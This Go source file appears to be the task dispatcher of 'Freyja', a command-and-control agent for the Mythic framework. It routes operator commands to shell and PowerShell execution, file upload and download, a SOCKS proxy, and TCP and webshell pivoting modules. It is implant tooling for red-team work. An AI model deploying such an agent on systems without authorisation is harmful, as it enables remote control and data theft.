package tasks

import (
	"os"

	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/bash_executor"
	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/cmd_executor"
	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/download"
	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/link_tcp"
	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/link_webshell"
	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/pkg/utils/structs"
	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/powershell_executor"
	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/sh_executor"
	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/sleep"
	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/socks"
	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/unlink_tcp"
	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/unlink_webshell"
	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/upload"
	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/zsh_executor"
)

var newTaskChannel = make(chan structs.Task, 10)

// listenForNewTask uses NewTaskChannel to spawn goroutine based on task's Run method
func listenForNewTask() {
	for {
		task := <-newTaskChannel
		switch task.Command {
		case "exit":
			os.Exit(0)
		case "sh_executor":
			go sh_executor.Run(task)
		case "bash_executor":
			go bash_executor.Run(task)
		case "zsh_executor":
			go zsh_executor.Run(task)
		case "cmd_executor":
			go cmd_executor.Run(task)
		case "powershell_executor":
			go powershell_executor.Run(task)
		case "download":
			go download.Run(task)
		case "upload":
			go upload.Run(task)
		case "sleep":
			go sleep.Run(task)
		case "jobs":
			go getJobListing(task)
		case "jobkill":
			go killJob(task)
		case "socks":
			go socks.Run(task)
		case "link_tcp":
			go link_tcp.Run(task)
		case "unlink_tcp":
			go unlink_tcp.Run(task)
		case "link_webshell":
			go link_webshell.Run(task)
		case "unlink_webshell":
			go unlink_webshell.Run(task)
		default:
			// No tasks, do nothing
			break
		}
	}
}
